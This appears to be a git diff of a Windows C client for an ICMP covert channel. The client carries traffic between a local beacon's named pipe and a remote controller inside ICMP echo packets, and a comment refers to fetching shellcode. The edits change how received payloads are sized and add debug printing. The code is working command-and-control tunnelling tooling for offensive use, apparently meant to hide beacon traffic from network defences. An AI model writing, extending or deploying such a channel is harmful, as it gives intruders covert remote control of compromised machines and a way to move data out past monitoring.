@@ -1,4 +1,6 @@
-﻿#define _WINSOCK_DEPRECATED_NO_WARNINGS
+﻿//32 bit version of the client. Should be the saem as the 64 bit but have a seperate version just in case.
+
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #pragma comment(lib, "ws2_32.lib")
 
 #include <stdint.h>
@@ -76,7 +78,7 @@ ex:
 // Prototypes
 int  send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num);
 char* recv_icmp_fragments(SOCKET s, uint32_t *out_len);
-char* recv_icmp(SOCKET s);
+char* recv_icmp(SOCKET s, uint32_t *out_len);
 DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max);
 void write_frame(HANDLE my_handle, char * buffer, DWORD length);
 int bridge_to_beacon();
@@ -325,7 +327,55 @@ char* recv_icmp_fragments(SOCKET s, uint32_t *out_len) {
 // recv_icmp: simple wrapper to receive a single Echo Reply (Type 0) carrying a small payload.
 // Returns a malloc’d buffer (null‐terminated) of payload bytes after the TAG.
 //
-char* recv_icmp(SOCKET s) {
+// char* recv_icmp(SOCKET s) {
+//     char recvbuf[MAX_PACKET_SIZE];
+//     struct sockaddr_in from;
+//     int fromlen = sizeof(from);
+
+//     printf("[*] Waiting for single ICMP Echo Reply...\n");
+//     int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
+//     if (bytes == SOCKET_ERROR) {
+//         printf("[-] recvfrom failed: %d\n", WSAGetLastError());
+//         return NULL;
+//     }
+
+//     if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
+//         return NULL;
+//     }
+
+//     struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
+//     char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);
+
+//     // Must be an Echo Reply (Type 0) for our PID
+//     if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
+//         return NULL;
+//     }
+//     if (ntohs(icmp->ID) != (USHORT)GetCurrentProcessId()) {
+//         return NULL;
+//     }
+//     // Must begin with TAG
+//     if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
+//         return NULL;
+//     }
+
+//     // Copy whatever bytes follow the tag
+//     int payload_len = bytes - IPV4_HEADER - sizeof(struct icmp_header) - TAG_SIZE;
+//     if (payload_len <= 0) {
+//         return NULL;
+//     }
+//     char* out_data = (char*)malloc(payload_len + 1);
+//     if (!out_data) {
+//         perror("malloc");
+//         return NULL;
+//     }
+//     memcpy(out_data, payload + TAG_SIZE, payload_len);
+//     out_data[payload_len] = '\0';
+//     return out_data;
+// }
+
+// Modified recv_icmp to return both a data buffer and its length.
+// Caller must pass a pointer to a uint32_t to receive the length.
+char* recv_icmp(SOCKET s, uint32_t *out_len) {
     char recvbuf[MAX_PACKET_SIZE];
     struct sockaddr_in from;
     int fromlen = sizeof(from);
@@ -337,6 +387,7 @@ char* recv_icmp(SOCKET s) {
         return NULL;
     }
 
+    // Must have at least IPv4 header + ICMP header + TAG
     if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
         return NULL;
     }
@@ -344,32 +395,40 @@ char* recv_icmp(SOCKET s) {
     struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
     char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);
 
-    // Must be an Echo Reply (Type 0) for our PID
+    // ─── Check: It must be an Echo Reply for our PID ───
     if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
         return NULL;
     }
     if (ntohs(icmp->ID) != (USHORT)GetCurrentProcessId()) {
         return NULL;
     }
-    // Must begin with TAG
+    // ─── Check: Payload must begin with TAG ───
     if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
         return NULL;
     }
 
-    // Copy whatever bytes follow the tag
-    int payload_len = bytes - IPV4_HEADER - sizeof(struct icmp_header) - TAG_SIZE;
+    // Compute how many bytes follow the TAG
+    int payload_len = bytes
+                    - IPV4_HEADER
+                    - sizeof(struct icmp_header)
+                    - TAG_SIZE;
     if (payload_len <= 0) {
         return NULL;
     }
-    char* out_data = (char*)malloc(payload_len + 1);
+
+    // Allocate exactly payload_len bytes (+ no extra null terminator)
+    char* out_data = (char*)malloc(payload_len);
     if (!out_data) {
         perror("malloc");
         return NULL;
     }
     memcpy(out_data, payload + TAG_SIZE, payload_len);
-    out_data[payload_len] = '\0';
+
+    // Set the out_len so caller knows the exact size
+    *out_len = (uint32_t)payload_len;
     return out_data;
 }
+
 
 /*
 Gets payload, returns char * to shellcode
@@ -571,11 +630,18 @@ int bridge_to_beacon() {
     while (TRUE) {
         // Read from beacon’s pipe
         DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
-        //may need to disable this for testing:
         // if (beacon_output == 0 || beacon_output == (DWORD)-1) {
-        //     printf("[+] No data, exiting\n");
+        //     printf("[+] No data (or error) from pipe, exiting\n");
         //     break;
         // }
+
+        // --- New: print exactly what came over the pipe ---
+        // Note: we assume the data is printable. If it can be binary, consider hex-dump instead.
+        printf("[+] Read %u bytes from named pipe: \"", beacon_output);
+        // Use "%.*s" to avoid overruns if there is no trailing '\0'
+        printf("%.*s", beacon_output, pipe_buffer);
+        printf("\"\n");
+        // ---------------------------------------------------
 
         // Construct chunk payload: TAG + data
         int data_len = (int)beacon_output;
@@ -591,10 +657,30 @@ int bridge_to_beacon() {
         send_icmp(s, &dest, chunk_buf, chunk_payload_len, 1);
 
         // Wait for controller’s response (type 0)
-        char* controller_resp = recv_icmp(s);
+        printf("[+] Getting data from controller\n");
+        // char* controller_resp = recv_icmp(s);
+        // if (controller_resp) {
+        //     // Print raw bytes and length of controller_resp
+        //     size_t resp_len = strlen(controller_resp);
+        //     printf("[+] Controller says (%zu bytes): \"", resp_len);
+        //     printf("%.*s", (int)resp_len, controller_resp);
+        //     printf("\"\n");
+
+        //     // write back to beacon with response
+        //     write_frame(handle_beacon, controller_resp, (DWORD)resp_len);
+        //     free(controller_resp);
+        // }
+
+        printf("[+] Getting data from controller\n");
+        uint32_t controller_len = 0;
+        char* controller_resp = recv_icmp(s, &controller_len);
         if (controller_resp) {
-            //write back to beacon with response
-            write_frame(handle_beacon, controller_resp, (DWORD)strlen(controller_resp));
+            printf("[+] Controller says (%u bytes): \"", controller_len);
+            printf("%.*s", controller_len, controller_resp);
+            printf("\"\n");
+
+            // Write the exact controller_len bytes into the beacon pipe
+            write_frame(handle_beacon, controller_resp, controller_len);
             free(controller_resp);
         }
 
